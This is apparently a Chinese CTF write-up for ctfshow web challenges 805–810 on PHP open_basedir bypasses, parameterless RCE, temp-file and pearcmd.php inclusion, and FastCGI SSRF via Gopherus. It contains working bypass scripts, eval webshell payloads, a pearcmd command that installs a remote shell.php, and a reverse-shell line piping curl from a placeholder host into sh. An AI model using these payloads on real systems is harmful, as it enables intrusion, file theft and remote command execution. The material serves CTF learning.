<h1 id="web805（open-basedir绕过）"><a href="#web805（open-basedir绕过）" class="headerlink" title="web805（open_basedir绕过）"></a>web805（open_basedir绕过）</h1><blockquote>
<p>open_basedir 的作用就是指定目录位置了,意思是将PHP<br>所能打开的文件限制在指定的目录树,包括文件本身了,并且不受是不是安全模式的影响.</p>
</blockquote>
<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>方式1—DirectoryIterator+glob://<br>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。<br>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;glob:///*&quot;</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f01eb4dfb8fe448891f81604c3a73d9a.png"><br>方式2——opendir()+readdir()+glob://<br>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$b</span> = opendir(<span class="variable">$a</span>) ) &#123;</span><br><span class="line">    <span class="keyword">while</span> ( (<span class="variable">$file</span> = readdir(<span class="variable">$b</span>)) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(<span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。<br>利用p神脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* by phithon</span></span><br><span class="line"><span class="comment">* From https://www.leavesongs.com</span></span><br><span class="line"><span class="comment">* detail: http://cxsecurity.com/issue/WLB-2009110068</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&#x27;content-type: text/plain&#x27;</span>);</span><br><span class="line">error_reporting(-<span class="number">1</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">printf(<span class="string">&quot;open_basedir: %s\nphp_version: %s\n&quot;</span>, ini_get(<span class="string">&#x27;open_basedir&#x27;</span>), phpversion());</span><br><span class="line">printf(<span class="string">&quot;disable_functions: %s\n&quot;</span>, ini_get(<span class="string">&#x27;disable_functions&#x27;</span>));</span><br><span class="line"><span class="variable">$file</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="variable">$relat_file</span> = getRelativePath(<span class="keyword">__FILE__</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$name</span> = mt_rand() % <span class="number">999</span>;</span><br><span class="line"><span class="variable">$exp</span> = getRandStr();</span><br><span class="line">mkdir(<span class="variable">$name</span>);</span><br><span class="line">chdir(<span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">1</span> ; <span class="variable">$i</span> &lt; count(<span class="variable">$paths</span>) - <span class="number">1</span> ; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    mkdir(<span class="variable">$paths</span>[<span class="variable">$i</span>]);</span><br><span class="line">    chdir(<span class="variable">$paths</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir(<span class="variable">$paths</span>[<span class="variable">$i</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> -= <span class="number">1</span>; <span class="variable">$i</span> &gt; <span class="number">0</span>; <span class="variable">$i</span>--) &#123; </span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$relat_file</span>);</span><br><span class="line"><span class="variable">$j</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$paths</span>[<span class="variable">$i</span>] == <span class="string">&#x27;..&#x27;</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    mkdir(<span class="variable">$name</span>);</span><br><span class="line">    chdir(<span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$j</span>++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt;= <span class="variable">$j</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tmp</span> = array_fill(<span class="number">0</span>, <span class="variable">$j</span> + <span class="number">1</span>, <span class="variable">$name</span>);</span><br><span class="line">symlink(implode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$tmp</span>), <span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line"><span class="variable">$tmp</span> = array_fill(<span class="number">0</span>, <span class="variable">$j</span>, <span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">symlink(<span class="string">&#x27;tmplink/&#x27;</span> . implode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$tmp</span>) . <span class="variable">$file</span>, <span class="variable">$exp</span>);</span><br><span class="line">unlink(<span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line">mkdir(<span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line">delfile(<span class="variable">$name</span>);</span><br><span class="line"><span class="variable">$exp</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>]) . <span class="string">&quot;/<span class="subst">&#123;$exp&#125;</span>&quot;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&quot;http://<span class="subst">&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;</span><span class="subst">&#123;$exp&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n-----------------content---------------\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$exp</span>);</span><br><span class="line">delfile(<span class="string">&#x27;tmplink&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRelativePath</span>(<span class="params"><span class="variable">$from</span>, <span class="variable">$to</span></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some compatibility fixes for Windows paths</span></span><br><span class="line">  <span class="variable">$from</span> = rtrim(<span class="variable">$from</span>, <span class="string">&#x27;\/&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">  <span class="variable">$from</span> = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$from</span>);</span><br><span class="line">  <span class="variable">$to</span>   = str_replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="variable">$to</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$from</span>   = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$from</span>);</span><br><span class="line">  <span class="variable">$to</span>     = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$to</span>);</span><br><span class="line">  <span class="variable">$relPath</span>  = <span class="variable">$to</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$from</span> <span class="keyword">as</span> <span class="variable">$depth</span> =&gt; <span class="variable">$dir</span>) &#123;</span><br><span class="line">    <span class="comment">// find first non-matching dir</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="variable">$to</span>[<span class="variable">$depth</span>]) &#123;</span><br><span class="line">      <span class="comment">// ignore this directory</span></span><br><span class="line">      array_shift(<span class="variable">$relPath</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// get number of remaining dirs to $from</span></span><br><span class="line">      <span class="variable">$remaining</span> = count(<span class="variable">$from</span>) - <span class="variable">$depth</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$remaining</span> &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// add traversals up to first matching dir</span></span><br><span class="line">        <span class="variable">$padLength</span> = (count(<span class="variable">$relPath</span>) + <span class="variable">$remaining</span> - <span class="number">1</span>) * -<span class="number">1</span>;</span><br><span class="line">        <span class="variable">$relPath</span> = array_pad(<span class="variable">$relPath</span>, <span class="variable">$padLength</span>, <span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$relPath</span>[<span class="number">0</span>] = <span class="string">&#x27;./&#x27;</span> . <span class="variable">$relPath</span>[<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> implode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$relPath</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delfile</span>(<span class="params"><span class="variable">$deldir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (@is_file(<span class="variable">$deldir</span>)) &#123;</span><br><span class="line">        @chmod(<span class="variable">$deldir</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @unlink(<span class="variable">$deldir</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(@is_dir(<span class="variable">$deldir</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="variable">$mydir</span> = @opendir(<span class="variable">$deldir</span>)) == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">false</span> !== (<span class="variable">$file</span> = @readdir(<span class="variable">$mydir</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$name</span> = File_Str(<span class="variable">$deldir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">if</span>((<span class="variable">$file</span>!=<span class="string">&#x27;.&#x27;</span>) &amp;&amp; (<span class="variable">$file</span>!=<span class="string">&#x27;..&#x27;</span>))&#123;delfile(<span class="variable">$name</span>);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir(<span class="variable">$mydir</span>);</span><br><span class="line">        @chmod(<span class="variable">$deldir</span>,<span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> @rmdir(<span class="variable">$deldir</span>) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">File_Str</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;//&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,str_replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="variable">$string</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandStr</span>(<span class="params"><span class="variable">$length</span> = <span class="number">6</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$randStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$randStr</span> .= substr(<span class="variable">$chars</span>, mt_rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randStr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>需要利用文件包含<br><img src="https://img-blog.csdnimg.cn/af44c6db5886430982ddc3966a861474.png"><br>也可以利用利用chdir()与ini_set()组合Bypass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="comment">// 获取当前目录</span></span><br><span class="line"><span class="keyword">echo</span> getcwd() . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改变目录</span></span><br><span class="line">chdir(<span class="string">&quot;images&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得当前目录</span></span><br><span class="line"><span class="keyword">echo</span> getcwd();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果：</span><br><span class="line"></span><br><span class="line">/home/php</span><br><span class="line">/home/php/images</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;s&quot;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;s&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">chdir(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/ctfshowflag&quot;</span>);</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/116078744">chdir()与ini_set()组合详解</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hookjoy/p/12846164.html">open_basedir绕过</a></p>
<h1 id="web806（无参rce）"><a href="#web806（无参rce）" class="headerlink" title="web806（无参rce）"></a>web806（无参rce）</h1><h2 id="利用session-id"><a href="#利用session-id" class="headerlink" title="利用session_id"></a>利用session_id</h2><p>php中有一个函数叫session_id(),可以直接获取到cookie中的phpsessionid值，phpsessionid的组成符号有限定,不能使用 ’ () ‘，所以我们需要将我们要执行的命令转换成16进制，然后再通过hex2bin函数转换回去</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> bin2hex(<span class="string">&#x27;phpinfo();&#x27;</span>);  <span class="comment">//706870696e666f28293b</span></span><br></pre></td></tr></table></figure>
<p>但是呢，session_id的使用需要开启session，所以需要session_start()函数<br>hex2bin(session_id(session_start()))<br>但是呢，仅仅一个eval执行上面代码只会把十六进制转换成字符串’phpinfo();’,所以我们还需要一个eval<br>最终<br><img src="https://img-blog.csdnimg.cn/109de13201aa4498ba456b524c137a2a.png"><br>由于806的php版本为7 则无法利用这个姿势</p>
<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>利用var_dump(getallheaders());获取位置信息<br><img src="https://img-blog.csdnimg.cn/cf670d92d5894db9850a13b7b1a08840.png"><br>之后通过修改相应位置的信息进行命令执行<br>这两个命令执行效果相同</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(current(getallheaders()));</span><br><span class="line"><span class="keyword">eval</span>(end(array_reverse(getallheaders())));</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/307ccab6b4fb43cdaf7e0797f8a49d94.png"><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/106602261">大佬博客</a></p>
<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>get_defined_vars()：返回由所有已定义变量所组成的数组<br>该命令 上面博客已写<br>也可利用群主师傅的命令随机碰撞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(array_rand(array_flip(str_split(set_include_path(dirname(dirname(dirname(getcwd())))))))))));</span><br></pre></td></tr></table></figure>
<h1 id="web807（shell反弹）"><a href="#web807（shell反弹）" class="headerlink" title="web807（shell反弹）"></a>web807（shell反弹）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$schema</span> = substr(<span class="variable">$url</span>,<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$schema</span>===<span class="string">&quot;https://&quot;</span>)&#123;</span><br><span class="line">    shell_exec(<span class="string">&quot;curl <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以直接进行shell反弹也可以利用群主的网站进行反弹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/ip port |sh</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl命令</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9456473a0a14">linux下反弹shell的方法</a></p>
<h1 id="web808（卡临时文件包含）"><a href="#web808（卡临时文件包含）" class="headerlink" title="web808（卡临时文件包含）"></a>web808（卡临时文件包含）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> php版本 7.0，有完整的包含点，并且参数可控，/tmp目录可写<br> 还需要得到上传的文件名</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>php在上传文件时候会先保存在临时目录，在php脚本运行完后自动删除<br><img src="https://img-blog.csdnimg.cn/2001c08d75824d0c96a3666654834e5b.png"><br>其实就是让程序崩溃的同时上传文件，那么文件就会留在/tmp目录下。但是这种方法要知道文件名，要不然爆破起来也是挺麻烦的。<br>如果过滤了filter伪协议也可以包含自身来崩溃。</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>先创建一个上传表单</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">        &lt;form action=<span class="string">&quot;http://2af23aac-f3d7-45fa-a482-e46c74ea93ad.challenge.ctf.show/&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">            &lt;br /&gt;</span><br><span class="line">            &lt;input <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>记得修改域名<br>之后对其抓包并发送payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags/resource=/etc/passwd</span><br></pre></td></tr></table></figure>
<p>得到<br><img src="https://img-blog.csdnimg.cn/d3aa85daa5b94cbabdde58ab3d19f208.png"><br>之后返回原题刷新后会发现临时文件已经保存<br><img src="https://img-blog.csdnimg.cn/e0e771de7ba24dbe989c11b6cac26fac.png"><br>之后访问并利用即可得到flag</p>
<h1 id="web809（pear文件包含-RCE）"><a href="#web809（pear文件包含-RCE）" class="headerlink" title="web809（pear文件包含/RCE）"></a>web809（pear文件包含/RCE）</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><p><img src="https://img-blog.csdnimg.cn/e353c6f603fe499d8e4253953da597cf.png"></p>
<h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>看<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">大佬博客</a><br>从中可以得到paylaod</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/<span class="built_in">local</span>/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
<p>在这我们稍作修改</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/<span class="built_in">local</span>/lib/php/pearcmd.php&amp;+config-create+/&lt;?=<span class="built_in">eval</span>(<span class="variable">$_POST</span>[1]);?&gt;+/tmp/xin.php</span><br><span class="line">或</span><br><span class="line">?file=/usr/<span class="built_in">local</span>/lib/php/pearcmd.php&amp;aaa+install+-R+/var/www/html/+http://IP/shell.php</span><br></pre></td></tr></table></figure>
<p>传入即可(利用bp进行传入)</p>
<p>第二个成功需要在自己的vps上写文件<br><img src="https://img-blog.csdnimg.cn/b18db47fbe2d4dc489c8b6ac4dafabcd.png"><br><img src="https://img-blog.csdnimg.cn/928dd06f1b9f47bbb516a513105c29b3.png"><br>之后访问<br><img src="https://img-blog.csdnimg.cn/b17f23847d5a42ea948cdb517dc522d1.png"><br>第三个姿势<br><img src="https://img-blog.csdnimg.cn/33630c4a0e99406f9990d91a7794c845.png"></p>
<h1 id="web810"><a href="#web810" class="headerlink" title="web810"></a>web810</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>Libcurl版本：高于7.45.0<br>PHP-FPM：监听端口，版本高于5.3.3<br>知道目标机器上任意一个php文件绝对路径</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/followyou/p/9460058.html">php-fpm</a><br>工具下载地址<a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br>打fastcgi用法：<br>python gopherus.py –exploit fastcgi<br><img src="https://img-blog.csdnimg.cn/371ba9a3f5d942b6ad065df3f556114a.png"><br>最后将生成的payload下划线后面的url编码，也即gopher://127.0.0.1:9000/_后面的全部url编码<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/292437.html">SSRF漏洞之FastCGI利用篇</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">p神讲解</a></p>
